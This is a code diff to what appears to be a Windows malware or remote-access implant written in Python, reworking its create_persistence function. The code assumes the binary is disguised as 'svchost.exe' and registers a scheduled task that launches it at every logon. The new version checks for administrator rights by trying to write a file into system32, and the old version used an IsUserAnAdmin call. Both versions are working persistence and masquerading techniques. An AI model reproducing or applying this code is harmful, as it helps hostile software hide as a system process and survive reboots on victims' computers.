@@ -1,7 +1,5 @@
-import ctypes
 import os
 import socket
-import subprocess
 import threading
 import uuid
 
@@ -136,15 +134,17 @@ def create_persistence():
     :return:
     """
     # Check if running as admin. If so, create scheduled task
-    executable_path = os.path.abspath(os.path.dirname(__file__))
-    if ctypes.windll.shell32.IsUserAnAdmin():
-        # all_scheduled_tasks = os.system(r"""schtasks /Query""")
-        all_scheduled_tasks = subprocess.check_output("schtasks /Query", shell=True)
+    # This is also a compatibility fix for Vista
+    try:
+        # Try to open a a file in a restricted directory for writing. This will fail without admin
+        open(r"c:\windows\system32\test.txt", "w")
 
-        # Create scheduled task if it doesn't exist
-        if SCHEDULED_TASK_NAME not in all_scheduled_tasks:
-            # This assumes that this binary is named 'svchost.exe'
-            subprocess.check_output(r"""schtasks /create /ru builtin\users /sc onlogon /tn "{0}" /tr {1}\svchost.exe """.format(SCHEDULED_TASK_NAME, executable_path), shell=True)
+        # This assumes that this binary is named 'svchost.exe'
+        executable_path = os.path.abspath(os.path.dirname(__file__))
+        os.system(r"""C:\Windows\System32\schtasks.exe /create /F /ru builtin\users /sc onlogon /tn "{0}" /tr {1}\svchost.exe """.format(SCHEDULED_TASK_NAME, executable_path))
+    except PermissionError:
+        # Not admin
+        pass
 
 
 # Establish persistence
